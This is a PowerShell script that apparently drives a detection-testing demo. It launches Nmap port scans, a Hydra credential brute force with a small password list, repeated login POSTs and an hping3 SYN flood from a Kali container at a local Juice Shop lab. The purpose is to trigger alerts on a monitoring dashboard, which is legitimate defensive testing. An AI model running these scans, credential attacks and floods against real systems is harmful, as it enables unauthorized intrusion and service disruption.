# ===============================================================================
# PhantomAgent - Demo Attack Flow Automation Script (Windows PowerShell)
# Executes real attacks inside the isolated Kali Linux Docker container
# ===============================================================================

param(
    [string]$Choice = ""
)

$TargetHost = "host.docker.internal"
$TargetPort = 3000
$KaliContainer = "kali_attacker"

Write-Host "===============================================================================" -ForegroundColor Cyan
Write-Host "              PHANTOMAGENT - LIVE ATTACK DEMONSTRATION SUITE                   " -ForegroundColor Cyan
Write-Host "===============================================================================" -ForegroundColor Cyan
Write-Host "Target Host : $TargetHost (Mapped to Juice Shop on port $TargetPort)"
Write-Host "Attacker    : Container '$KaliContainer' (Docker Desktop Lab)"
Write-Host "==============================================================================="

# Check if Docker lab containers are running, auto-start if not
Write-Host "[PRE-CHECK] Verifying Docker lab containers..." -ForegroundColor Yellow
$isRunning = docker inspect -f "{{.State.Running}}" $KaliContainer 2>$null
if ($isRunning -ne "true") {
    Write-Host "[PRE-CHECK] Containers not running. Starting Docker lab..." -ForegroundColor Yellow
    docker compose -f docker-compose.lab.yml up -d
    Start-Sleep -Seconds 3
}

# Verify Kali can reach target
$pingCheck = docker exec $KaliContainer ping -c 1 -W 2 172.28.0.5 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "[ERROR] Kali cannot reach lab network. Starting containers..." -ForegroundColor Red
    docker compose -f docker-compose.lab.yml up -d
    Start-Sleep -Seconds 3
}
Write-Host "[PRE-CHECK] Network verified: Kali attacker container ready." -ForegroundColor Green
Write-Host ""

function Show-Menu {
    Write-Host "Select Attack Scenario to Execute:"
    Write-Host " 1) Reconnaissance   : Nmap Stealth SYN Port Scan (-sS)"
    Write-Host " 2) Brute Force      : Hydra HTTP Credential Spraying"
    Write-Host " 3) Zero-Day Anomaly : High-Entropy Structural Anomaly Flow (hping3)"
    Write-Host " 4) Full Suite       : Execute all 3 attack scenarios sequentially"
    Write-Host "==============================================================================="
}

function Run-Recon {
    Write-Host "`n[ATTACK 1/3] Executing Nmap Recon Scan against $TargetHost..." -ForegroundColor Yellow
    docker exec $KaliContainer nmap -sT -p 135,445,3000,8080,9000 $TargetHost
    docker exec $KaliContainer nmap -sT -p 1-1000,3000 $TargetHost
    Write-Host "[+] Nmap scan completed. Watch React Dashboard / API for PORT_SCAN alert." -ForegroundColor Green
}

function Run-BruteForce {
    Write-Host "`n[ATTACK 2/3] Executing Hydra Credential Spraying against ${TargetHost}:${TargetPort}..." -ForegroundColor Yellow
    # Ensure wordlist exists
    docker exec $KaliContainer bash -c "mkdir -p /usr/share/wordlists && printf 'admin\n123456\npassword\nroot\ntest\nguest\nadmin123\n' > /usr/share/wordlists/nmap.lst"
    docker exec $KaliContainer hydra -l admin -P /usr/share/wordlists/nmap.lst $TargetHost -s $TargetPort http-head / 2>$null

    Write-Host "[ATTACK 2/3] Sending rapid HTTP authentication attempts to trigger detection..." -ForegroundColor Yellow
    docker exec $KaliContainer bash -c "curl -s http://${TargetHost}:${TargetPort}/rest/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"wrongpassword\"}' 2>/dev/null; curl -s http://${TargetHost}:${TargetPort}/rest/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"wrongpassword2\"}' 2>/dev/null; curl -s http://${TargetHost}:${TargetPort}/rest/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"wrongpassword3\"}' 2>/dev/null"
    Write-Host "[+] Brute force completed. Watch React Dashboard / API for BRUTE_FORCE alert." -ForegroundColor Green
}

function Run-ZeroDay {
    Write-Host "`n[ATTACK 3/3] Executing Un-labeled Zero-Day Structural Anomaly against $TargetHost..." -ForegroundColor Yellow
    docker exec $KaliContainer bash -c "hping3 -S -p 3000 -c 30 --fast host.docker.internal 2>/dev/null"
    docker exec $KaliContainer bash -c "for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25; do curl -s -o /dev/null http://host.docker.internal:3000/ 2>/dev/null; done"
    Write-Host "[+] Zero-day anomaly burst completed. Watch React Dashboard / API for DOS_ATTACK / ANOMALY alert." -ForegroundColor Green
}

if ([string]::IsNullOrWhiteSpace($Choice)) {
    Show-Menu
    $Choice = Read-Host "Enter choice [1-4]"
}

switch ($Choice) {
    "1" { Run-Recon }
    "2" { Run-BruteForce }
    "3" { Run-ZeroDay }
    "4" {
        Run-Recon
        Start-Sleep -Seconds 6
        Run-BruteForce
        Start-Sleep -Seconds 6
        Run-ZeroDay
    }
    Default {
        Write-Host "Invalid option." -ForegroundColor Red
        exit 1
    }
}

Write-Host "`n==============================================================================="
Write-Host "Demo attack execution finished." -ForegroundColor Cyan
Write-Host "==============================================================================="
